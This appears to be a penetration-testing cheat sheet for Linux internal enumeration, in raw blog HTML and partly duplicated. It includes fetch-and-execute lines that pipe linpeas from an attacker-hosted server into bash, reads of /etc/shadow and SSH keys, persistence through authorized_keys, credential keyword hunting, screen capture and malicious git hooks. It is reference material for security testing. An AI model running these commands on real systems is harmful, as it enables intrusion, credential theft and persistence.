class=\"built_in\">stty</span> rows 54 columns 237\n<span class=\"built_in\">alias</span> ll=<span class=\"string\">&#x27;clear;ls -lsah --color=auto&#x27;</span></code></pre>\n\n<p>Another quick, optimized shell</p>\n<pre><code class=\"highlight bash\">script -q /dev/null</code></pre>\n\n<br>\n\n<h2 id=\"Automated-enumeration\"><a href=\"#Automated-enumeration\" class=\"headerlink\" title=\"Automated enumeration\"></a>Automated enumeration</h2><p>Download <code>linpeas</code></p>\n<pre><div class=\"caption\"><span>host a python server</span></div><code class=\"highlight bash\">wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh -O ~/tools/linpeas.sh\n<span class=\"built_in\">cd</span> ~/tools\n<span class=\"built_in\">chmod</span> +x linpeas.sh\npython3 -m http.server 8000</code></pre>\n<pre><div class=\"caption\"><span>run the script without writing to the disk</span></div><code class=\"highlight bash\">wget -O - http://10.10.14.10:8000/linpeas.sh | bash</code></pre>\n<pre><div class=\"caption\"><span>save the script and output</span></div><code class=\"highlight bash\">wget http://10.10.14.10:8000/linpeas.sh -O /dev/shm/linpeas.sh\nbash /dev/shm/linpeas.sh &gt; /dev/shm/linpeas.out</code></pre>\n\n<br>\n\n<h2 id=\"System-info\"><a href=\"#System-info\" class=\"headerlink\" title=\"System info\"></a>System info</h2><pre><code class=\"highlight bash\"><span class=\"comment\"># issue, release</span>\n<span class=\"built_in\">cat</span> /etc/issue\n<span class=\"built_in\">cat</span> /etc/*-release\n\n<span class=\"comment\"># distribution, version number</span>\n<span class=\"built_in\">cat</span> /etc/os-release\n\n<span class=\"comment\"># kernel</span>\n<span class=\"built_in\">uname</span> -a\n<span class=\"built_in\">uname</span> -smr\n\n<span class=\"comment\"># arch</span>\nfile /bin/bash</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># system name</span>\nhostname\n\n<span class=\"comment\"># users</span>\n<span class=\"built_in\">cat</span> /etc/passwd | grep <span class=\"string\">&#x27;sh$&#x27;</span>\n\n<span class=\"comment\"># environment</span>\n<span class=\"built_in\">cat</span> /etc/profile\n<span class=\"built_in\">cat</span> /etc/bashrc\n<span class=\"built_in\">cat</span> ~/.bash_profile\n<span class=\"built_in\">cat</span> ~/.bashrc\n<span class=\"built_in\">cat</span> ~/.bash_logout\n<span class=\"built_in\">env</span>\n<span class=\"built_in\">set</span>\n<span class=\"built_in\">ls</span> -lsa ~/.Xauthority <span class=\"comment\"># display misconfiguration?</span></code></pre>\n<p>Open files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> lsof</code></pre>\n<p>Docker environment</p>\n<pre><code class=\"highlight bash\">grep -Ri docker /proc --color=auto 2&gt;/dev/null\n<span class=\"built_in\">ls</span> -lsah /etc | grep -i docker</code></pre>\n<p>Installed applications</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /usr/bin/\n<span class=\"built_in\">ls</span> -lsah /sbin/</code></pre>\n<p>Installed packages</p>\n<pre><code class=\"highlight bash\">dpkg -l <span class=\"comment\"># debian</span>\nrpm -qa <span class=\"comment\"># RPM</span></code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><p>Files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/passwd\n<span class=\"built_in\">cat</span> /etc/group\n<span class=\"built_in\">cat</span> /etc/shadow\n<span class=\"built_in\">cat</span> /etc/crontab\n<span class=\"built_in\">cat</span> /etc/update-motd.d \n<span class=\"built_in\">ls</span> -lsah /etc/passwd\n<span class=\"built_in\">ls</span> -lsah /etc/sudoers</code></pre>\n<p>Directories</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsahR /home/\n<span class=\"built_in\">ls</span> -lsah ~/.ssh/\n<span class=\"built_in\">ls</span> -lsah /var/lib/\n<span class=\"built_in\">ls</span> -lsah /var/db/\n<span class=\"built_in\">ls</span> -lsah /opt/\n<span class=\"built_in\">ls</span> -lsah /tmp/\n<span class=\"built_in\">ls</span> -lsah /var/tmp/\n<span class=\"built_in\">ls</span> -lsah /dev/shm/\n<span class=\"built_in\">ls</span> -lsah /var/mail/\n<span class=\"built_in\">ls</span> -lsah /etc/cron.*\n<span class=\"built_in\">ls</span> -lsah /proc</code></pre>\n<p>Check for passwords</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /var/apache2\n<span class=\"built_in\">ls</span> -lsah /var/lib/mysql/mysql</code></pre>\n<p>Files recently created or modified</p>\n<pre><div class=\"caption\"><span>created or modified in the last 5 days</span></div><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n<p>Write permissions to files in &#x2F;etc&#x2F; - try to reconfigure services</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^.*w.*/&#x27;</span> 2&gt;/dev/null      <span class=\"comment\"># Anyone</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^..w/&#x27;</span> 2&gt;/dev/null        <span class=\"comment\"># Owner</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^.....w/&#x27;</span> 2&gt;/dev/null     <span class=\"comment\"># Group</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /w.$/&#x27;</span> 2&gt;/dev/null         <span class=\"comment\"># Other</span>\nfind /etc/ -readable -<span class=\"built_in\">type</span> f 2&gt;/dev/null             <span class=\"comment\"># Anyone</span>\nfind /etc/ -readable -<span class=\"built_in\">type</span> f -maxdepth 1 2&gt;/dev/null <span class=\"comment\"># Anyone</span></code></pre>\n<p>Mounted files</p>\n<pre><code class=\"highlight bash\">mount\n<span class=\"built_in\">df</span> -h</code></pre>\n<p>Unmounted file-systems</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/fstab</code></pre>\n<p>Writable message of the day</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /etc/update-motd.d</code></pre>\n<p>Files owned by the current user</p>\n<pre><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -user <span class=\"variable\">$&#123;whoami&#125;</span> -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> &#123;&#125; + 2&gt;/dev/null | grep -v proc</code></pre>\n<p>Files created or modified in the last 5 days</p>\n<pre><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n<p>Display configuration with <code>.Xauthority</code> and <code>.xsession</code> files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$Xauthority</span>\n<span class=\"built_in\">export</span> Xauthority=/home/$(<span class=\"built_in\">whoami</span>)/.Xauthority</code></pre>\n<p>Use X11 forwarding to capture the display remotely</p>\n<pre><code class=\"highlight bash\">xwd -root -screen -silent -display :0 &gt; /tmp/screen.xwd\nconvert screen.xwd screen.png</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><p>Processes</p>\n<pre><code class=\"highlight bash\">ps\nps aux | grep -i <span class=\"string\">&#x27;root&#x27;</span> --color=auto\nps axjf \nps ef | grep -i root</code></pre>\n<p>Filter using <code>grep</code></p>\n<pre><code class=\"highlight markdown\">-e   every process\n-f   full format\n-l   long format\n-u   details about user\n-j   jobs\n-f   forest  more visual</code></pre>\n<p>Scan processes</p>\n<pre><code class=\"highlight bash\">wget http://10.10.14.10:8000/pspy64 -O /dev/shm/pspy64\n<span class=\"built_in\">chmod</span> +x /dev/shm/pspy64\n/dev/shm/pspy64\n\nwget http://10.10.14.10:8000/pspy32 -O /dev/shm/pspy32\n<span class=\"built_in\">chmod</span> +x /dev/shm/pspy32\n/dev/shm/pspy32</code></pre>\n<p>Cronjobs</p>\n<pre><code class=\"highlight bash\">crontab -l\n<span class=\"built_in\">ls</span> -lsah /var/spool/cron\n<span class=\"built_in\">ls</span> -lsah /etc/ | grep cron\n<span class=\"built_in\">ls</span> -lsah /etc/cron*\n<span class=\"built_in\">cat</span> /etc/cron*\n<span class=\"built_in\">cat</span> /etc/at.allow\n<span class=\"built_in\">cat</span> /etc/at.deny\n<span class=\"built_in\">cat</span> /etc/cron.allow\n<span class=\"built_in\">cat</span> /etc/cron.deny\n<span class=\"built_in\">cat</span> /etc/crontab\n<span class=\"built_in\">cat</span> /etc/anacrontab\n<span class=\"built_in\">cat</span> /var/spool/cron/crontabs/root</code></pre>\n\n<br>\n\n<h2 id=\"Network\"><a href=\"#Network\" class=\"headerlink\" title=\"Network\"></a>Network</h2><p>IP addresses</p>\n<pre><code class=\"highlight bash\">ip a s\nifconfig -a</code></pre>\n<p>Interfaces</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/network/interfaces\n<span class=\"built_in\">cat</span> /etc/sysconfig/network</code></pre>\n<p>DNS server</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/resolf.conf</code></pre>\n<p>Routing table</p>\n<pre><code class=\"highlight bash\">netstat -rn</code></pre>\n<p>ARP table</p>\n<pre><code class=\"highlight bash\">arp -a\nroute\nroute -nee</code></pre>\n<p>Network connections information</p>\n<pre><code class=\"highlight bash\">ss\nss -tunlp\n<span class=\"built_in\">sudo</span> netstat\n<span class=\"built_in\">sudo</span> netstat -atunp\n<span class=\"built_in\">sudo</span> netstat -antpx\n<span class=\"built_in\">sudo</span> netstat -tulpn\nnetstat -tunlp | grep 127.0.0.1  <span class=\"comment\"># internal services such as MySQL</span></code></pre>\n<table>\n<thead>\n<tr>\n<th>-a</th>\n<th>show both listening and non-listening sockets</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-l</td>\n<td>show only listening sockets</td>\n</tr>\n<tr>\n<td>-n</td>\n<td>show numeric output instead of resolving the IP address and port number</td>\n</tr>\n<tr>\n<td>-t</td>\n<td>TCP</td>\n</tr>\n<tr>\n<td>-u</td>\n<td>UDP</td>\n</tr>\n<tr>\n<td>-x</td>\n<td>UNIX</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>Show the PID and name of the program to which the socket belongs</td>\n</tr>\n</tbody></table>\n<p>Display internet and network connections</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> lsof -i \n\n<span class=\"comment\"># limit to a single port</span>\n<span class=\"built_in\">sudo</span> lsof -i :25</code></pre>\n<p>List printers</p>\n<pre><code class=\"highlight bash\">lpstat -a</code></pre>\n<p>From dynamic config files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /proc/net/fib_trie <span class=\"comment\"># IPv4 addresses</span>\n<span class=\"built_in\">cat</span> /proc/net/tcp      <span class=\"comment\"># hex-encoded port data</span></code></pre>\n<p>View all TCP connections by non-user accounts</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> bpftrace -e <span class=\"string\">&#x27;kprobe:tcp_connect &#123; if (uid &lt; 1000) &#123; @[uid] = count(); &#125; &#125;&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"Users\"><a href=\"#Users\" class=\"headerlink\" title=\"Users\"></a>Users</h2><p>Logged in users</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">who</span>\nw\nlast\n\n<span class=\"built_in\">whoami</span>\n<span class=\"built_in\">id</span></code></pre>\n<p>Files owned by current user</p>\n<pre><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -user <span class=\"variable\">$&#123;whoami&#125;</span> -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> &#123;&#125; + 2&gt;/dev/null | grep -v proc</code></pre>\n<p>Authorize our own public key for access</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># locally</span>\nssh-keygen -o\n<span class=\"comment\"># from local to remote </span>\nscp ~/.ssh/id_rsa.pub remote-user@10.10.10.10:~/.ssh/\n<span class=\"comment\"># remote</span>\n<span class=\"built_in\">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys</code></pre>\n\n<br>\n\n<p>Script to list users</p>\n<pre><div class=\"caption\"><span>list_users.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\n\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;System users and last authentication date:&quot;</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;-----------------------------------------------------&quot;</span>\n\n<span class=\"keyword\">while</span> IFS=: <span class=\"built_in\">read</span> -r user _ uid _ _ home shell; <span class=\"keyword\">do</span>\n    <span class=\"keyword\">if</span> [[ <span class=\"string\">&quot;<span class=\"variable\">$shell</span>&quot;</span> =~ sh$ ]]; <span class=\"keyword\">then</span>\n        last_logon=$(last -n 1 -R <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> | <span class=\"built_in\">head</span> -n 1 | awk <span class=\"string\">&#x27;&#123;print $4, $5, $6&#125;&#x27;</span>)\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Username: <span class=\"variable\">$user</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;UID: <span class=\"variable\">$uid</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Home dir: <span class=\"variable\">$home</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Shell: <span class=\"variable\">$shell</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Last login: <span class=\"variable\">$last_logon</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;-----------------------------------------------------&quot;</span>\n    <span class=\"keyword\">fi</span>\n<span class=\"keyword\">done</span> &lt; /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Credentials\"><a href=\"#Credentials\" class=\"headerlink\" title=\"Credentials\"></a>Credentials</h2><pre><div class=\"caption\"><span>Eviltree</span></div><code class=\"highlight bash\"><span class=\"comment\"># regex</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -x <span class=\"string\">&quot;.&#123;0,3&#125;passwd.&#123;0.3&#125;[=]&#123;1&#125;.&#123;0,18&#125;&quot;</span> -A -q -i -v\n<span class=\"comment\"># keywords</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -k passw,db_,admin,account,user,token -A -q -i -v</code></pre>\n<pre><div class=\"caption\"><span>Scavanger</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> python2 ~/tools/scavanger/scavenger.py smb -t <span class=\"variable\">$IP</span> -u <span class=\"variable\">$username</span> -p <span class=\"string\">&#x27;$pass&#x27;</span> -d <span class=\"variable\">$domain</span></code></pre>\n\n<br>\n\n<h2 id=\"Others\"><a href=\"#Others\" class=\"headerlink\" title=\"Others\"></a>Others</h2><p>Git commits</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">log</span>        <span class=\"comment\"># list commits</span>\ngit <span class=\"built_in\">log</span> -p     <span class=\"comment\"># the patch output</span>\ngit <span class=\"built_in\">log</span> -p -2  <span class=\"comment\"># last 2 entries</span>\ngit <span class=\"built_in\">log</span> --<span class=\"built_in\">stat</span> <span class=\"comment\"># view stats</span></code></pre>\n<p>Exploit git hooks</p>\n<pre><div class=\"caption\"><span>pre-commit hook</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;#!/bin/sh\\nmalicious_command&quot;</span> &gt; .git/hooks/pre-commit\n<span class=\"built_in\">chmod</span> +x .git/hooks/pre-commit</code></pre>\n<pre><div class=\"caption\"><span>post-checkout hook</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;#!/bin/sh\\nmalicious_command&quot;</span> &gt; .git/hooks/post-checkout\n<span class=\"built_in\">chmod</span> +x .git/hooks/post-checkout\n</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 5 in a penetration test: Internal enumeration.<br>Find as much relevant info about the target: networking, services, administration, file system.</p>\n<hr>","more":"<br>\n\n\n<h2 id=\"Interactive-shell\"><a href=\"#Interactive-shell\" class=\"headerlink\" title=\"Interactive shell\"></a>Interactive shell</h2><p>Check python version</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">which</span> python\n<span class=\"built_in\">which</span> python3</code></pre>\n\n<p>Python bash TTY</p>\n<pre><code class=\"highlight bash\">python -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> \npython3 -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></code></pre>\n\n<p>Export TTY</p>\n<pre><code class=\"highlight bash\">CTRL + Z \n<span class=\"built_in\">stty</span> raw -<span class=\"built_in\">echo</span>; <span class=\"built_in\">fg</span>; <span class=\"built_in\">export</span> SHELL=/bin/bash; <span class=\"built_in\">export</span> TERM=xterm-256color; <span class=\"built_in\">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;</code></pre>\n\n<p>Adds-on</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> TERM=xterm\n<span class=\"built_in\">stty</span> rows 54 columns 237\n<span class=\"built_in\">alias</span> ll=<span class=\"string\">&#x27;clear;ls -lsah --color=auto&#x27;</span></code></pre>\n\n<p>Another quick, optimized shell</p>\n<pre><code class=\"highlight bash\">script -q /dev/null</code></pre>\n\n<br>\n\n<h2 id=\"Automated-enumeration\"><a href=\"#Automated-enumeration\" class=\"headerlink\" title=\"Automated enumeration\"></a>Automated enumeration</h2><p>Download <code>linpeas</code></p>\n<pre><div class=\"caption\"><span>host a python server</span></div><code class=\"highlight bash\">wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh -O ~/tools/linpeas.sh\n<span class=\"built_in\">cd</span> ~/tools\n<span class=\"built_in\">chmod</span> +x linpeas.sh\npython3 -m http.server 8000</code></pre>\n<pre><div class=\"caption\"><span>run the script without writing to the disk</span></div><code class=\"highlight bash\">wget -O - http://10.10.14.10:8000/linpeas.sh | bash</code></pre>\n<pre><div class=\"caption\"><span>save the script and output</span></div><code class=\"highlight bash\">wget http://10.10.14.10:8000/linpeas.sh -O /dev/shm/linpeas.sh\nbash /dev/shm/linpeas.sh &gt; /dev/shm/linpeas.out</code></pre>\n\n<br>\n\n<h2 id=\"System-info\"><a href=\"#System-info\" class=\"headerlink\" title=\"System info\"></a>System info</h2><pre><code class=\"highlight bash\"><span class=\"comment\"># issue, release</span>\n<span class=\"built_in\">cat</span> /etc/issue\n<span class=\"built_in\">cat</span> /etc/*-release\n\n<span class=\"comment\"># distribution, version number</span>\n<span class=\"built_in\">cat</span> /etc/os-release\n\n<span class=\"comment\"># kernel</span>\n<span class=\"built_in\">uname</span> -a\n<span class=\"built_in\">uname</span> -smr\n\n<span class=\"comment\"># arch</span>\nfile /bin/bash</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># system name</span>\nhostname\n\n<span class=\"comment\"># users</span>\n<span class=\"built_in\">cat</span> /etc/passwd | grep <span class=\"string\">&#x27;sh$&#x27;</span>\n\n<span class=\"comment\"># environment</span>\n<span class=\"built_in\">cat</span> /etc/profile\n<span class=\"built_in\">cat</span> /etc/bashrc\n<span class=\"built_in\">cat</span> ~/.bash_profile\n<span class=\"built_in\">cat</span> ~/.bashrc\n<span class=\"built_in\">cat</span> ~/.bash_logout\n<span class=\"built_in\">env</span>\n<span class=\"built_in\">set</span>\n<span class=\"built_in\">ls</span> -lsa ~/.Xauthority <span class=\"comment\"># display misconfiguration?</span></code></pre>\n<p>Open files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> lsof</code></pre>\n<p>Docker environment</p>\n<pre><code class=\"highlight bash\">grep -Ri docker /proc --color=auto 2&gt;/dev/null\n<span class=\"built_in\">ls</span> -lsah /etc | grep -i docker</code></pre>\n<p>Installed applications</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /usr/bin/\n<span class=\"built_in\">ls</span> -lsah /sbin/</code></pre>\n<p>Installed packages</p>\n<pre><code class=\"highlight bash\">dpkg -l <span class=\"comment\"># debian</span>\nrpm -qa <span class=\"comment\"># RPM</span></code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><p>Files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/passwd\n<span class=\"built_in\">cat</span> /etc/group\n<span class=\"built_in\">cat</span> /etc/shadow\n<span class=\"built_in\">cat</span> /etc/crontab\n<span class=\"built_in\">cat</span> /etc/update-motd.d \n<span class=\"built_in\">ls</span> -lsah /etc/passwd\n<span class=\"built_in\">ls</span> -lsah /etc/sudoers</code></pre>\n<p>Directories</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsahR /home/\n<span class=\"built_in\">ls</span> -lsah ~/.ssh/\n<span class=\"built_in\">ls</span> -lsah /var/lib/\n<span class=\"built_in\">ls</span> -lsah /var/db/\n<span class=\"built_in\">ls</span> -lsah /opt/\n<span class=\"built_in\">ls</span> -lsah /tmp/\n<span class=\"built_in\">ls</span> -lsah /var/tmp/\n<span class=\"built_in\">ls</span> -lsah /dev/shm/\n<span class=\"built_in\">ls</span> -lsah /var/mail/\n<span class=\"built_in\">ls</span> -lsah /etc/cron.*\n<span class=\"built_in\">ls</span> -lsah /proc</code></pre>\n<p>Check for passwords</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /var/apache2\n<span class=\"built_in\">ls</span> -lsah /var/lib/mysql/mysql</code></pre>\n<p>Files recently created or modified</p>\n<pre><div class=\"caption\"><span>created or modified in the last 5 days</span></div><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n<p>Write permissions to files in &#x2F;etc&#x2F; - try to reconfigure services</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^.*w.*/&#x27;</span> 2&gt;/dev/null      <span class=\"comment\"># Anyone</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^..w/&#x27;</span> 2&gt;/dev/null        <span class=\"comment\"># Owner</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /^.....w/&#x27;</span> 2&gt;/dev/null     <span class=\"comment\"># Group</span>\n<span class=\"built_in\">ls</span> -aRl /etc/ | awk <span class=\"string\">&#x27;$1 ~ /w.$/&#x27;</span> 2&gt;/dev/null         <span class=\"comment\"># Other</span>\nfind /etc/ -readable -<span class=\"built_in\">type</span> f 2&gt;/dev/null             <span class=\"comment\"># Anyone</span>\nfind /etc/ -readable -<span class=\"built_in\">type</span> f -maxdepth 1 2&gt;/dev/null <span class=\"comment\"># Anyone</span></code></pre>\n<p>Mounted files</p>\n<pre><code class=\"highlight bash\">mount\n<span class=\"built_in\">df</span> -h</code></pre>\n<p>Unmounted file-systems</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/fstab</code></pre>\n<p>Writable message of the day</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lsah /etc/update-motd.d</code></pre>\n<p>Files owned by the current user</p>\n<pre><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -user <span class=\"variable\">$&#123;whoami&#125;</span> -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> &#123;&#125; + 2&gt;/dev/null | grep -v proc</code></pre>\n<p>Files created or modified in the last 5 days</p>\n<pre><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n<p>Display configuration with <code>.Xauthority</code> and <code>.xsession</code> files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$Xauthority</span>\n<span class=\"built_in\">export</span> Xauthority=/home/$(<span class=\"built_in\">whoami</span>)/.Xauthority</code></pre>\n<p>Use X11 forwarding to capture the display remotely</p>\n<pre><code class=\"highlight bash\">xwd -root -screen -silent -display :0 &gt; /tmp/screen.xwd\nconvert screen.xwd screen.png</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><p>Processes</p>\n<pre><code class=\"highlight bash\">ps\nps aux | grep -i <span class=\"string\">&#x27;root&#x27;</span> --color=auto\nps axjf \nps ef | grep -i root</code></pre>\n<p>Filter using <code>grep</code></p>\n<pre><code class=\"highlight markdown\">-e   every process\n-f   full format\n-l   long format\n-u   details about user\n-j   jobs\n-f   forest  more visual</code></pre>\n<p>Scan processes</p>\n<pre><code class=\"highlight bash\">wget http://10.10.14.10:8000/pspy64 -O /dev/shm/pspy64\n<span class=\"built_in\">chmod</span> +x /dev/shm/pspy64\n/dev/shm/pspy64\n\nwget http://10.10.14.10:8000/pspy32 -O /dev/shm/pspy32\n<span class=\"built_in\">chmod</span> +x /dev/shm/pspy32\n/dev/shm/pspy32</code></pre>\n<p>Cronjobs</p>\n<pre><code class=\"highlight bash\">crontab -l\n<span class=\"built_in\">ls</span> -lsah /var/spool/cron\n<span class=\"built_in\">ls</span> -lsah /etc/ | grep cron\n<span class=\"built_in\">ls</span> -lsah /etc/cron*\n<span class=\"built_in\">cat</span> /etc/cron*\n<span class=\"built_in\">cat</span> /etc/at.allow\n<span class=\"built_in\">cat</span> /etc/at.deny\n<span class=\"built_in\">cat</span> /etc/cron.allow\n<span class=\"built_in\">cat</span> /etc/cron.deny\n<span class=\"built_in\">cat</span> /etc/crontab\n<span class=\"built_in\">cat</span> /etc/anacrontab\n<span class=\"built_in\">cat</span> /var/spool/cron/crontabs/root</code></pre>\n\n<br>\n\n<h2 id=\"Network\"><a href=\"#Network\" class=\"headerlink\" title=\"Network\"></a>Network</h2><p>IP addresses</p>\n<pre><code class=\"highlight bash\">ip a s\nifconfig -a</code></pre>\n<p>Interfaces</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/network/interfaces\n<span class=\"built_in\">cat</span> /etc/sysconfig/network</code></pre>\n<p>DNS server</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/resolf.conf</code></pre>\n<p>Routing table</p>\n<pre><code class=\"highlight bash\">netstat -rn</code></pre>\n<p>ARP table</p>\n<pre><code class=\"highlight bash\">arp -a\nroute\nroute -nee</code></pre>\n<p>Network connections information</p>\n<pre><code class=\"highlight bash\">ss\nss -tunlp\n<span class=\"built_in\">sudo</span> netstat\n<span class=\"built_in\">sudo</span> netstat -atunp\n<span class=\"built_in\">sudo</span> netstat -antpx\n<span class=\"built_in\">sudo</span> netstat -tulpn\nnetstat -tunlp | grep 127.0.0.1  <span class=\"comment\"># internal services such as MySQL</span></code></pre>\n<table>\n<thead>\n<tr>\n<th>-a</th>\n<th>show both listening and non-listening sockets</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-l</td>\n<td>show only listening sockets</td>\n</tr>\n<tr>\n<td>-n</td>\n<td>show numeric output instead of resolving the IP address and port number</td>\n</tr>\n<tr>\n<td>-t</td>\n<td>TCP</td>\n</tr>\n<tr>\n<td>-u</td>\n<td>UDP</td>\n</tr>\n<tr>\n<td>-x</td>\n<td>UNIX</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>Show the PID and name of the program to which the socket belongs</td>\n</tr>\n</tbody></table>\n<p>Display internet and network connections</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> lsof -i \n\n<span class=\"comment\"># limit to a single port</span>\n<span class=\"built_in\">sudo</span> lsof -i :25</code></pre>\n<p>List printers</p>\n<pre><code class=\"highlight bash\">lpstat -a</code></pre>\n<p>From dynamic config files</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /proc/net/fib_trie <span class=\"comment\"># IPv4 addresses</span>\n<span class=\"built_in\">cat</span> /proc/net/tcp      <span class=\"comment\"># hex-encoded port data</span></code></pre>\n<p>View all TCP connections by non-user accounts</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> bpftrace -e <span class=\"string\">&#x27;kprobe:tcp_connect &#123; if (uid &lt; 1000) &#123; @[uid] = count(); &#125; &#125;&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"Users\"><a href=\"#Users\" class=\"headerlink\" title=\"Users\"></a>Users</h2><p>Logged in users</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">who</span>\nw\nlast\n\n<span class=\"built_in\">whoami</span>\n<span class=\"built_in\">id</span></code></pre>\n<p>Files owned by current user</p>\n<pre><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -user <span class=\"variable\">$&#123;whoami&#125;</span> -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> &#123;&#125; + 2&gt;/dev/null | grep -v proc</code></pre>\n<p>Authorize our own public key for access</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># locally</span>\nssh-keygen -o\n<span class=\"comment\"># from local to remote </span>\nscp ~/.ssh/id_rsa.pub remote-user@10.10.10.10:~/.ssh/\n<span class=\"comment\"># remote</span>\n<span class=\"built_in\">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys</code></pre>\n\n<br>\n\n<p>Script to list users</p>\n<pre><div class=\"caption\"><span>list_users.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\n\n<span 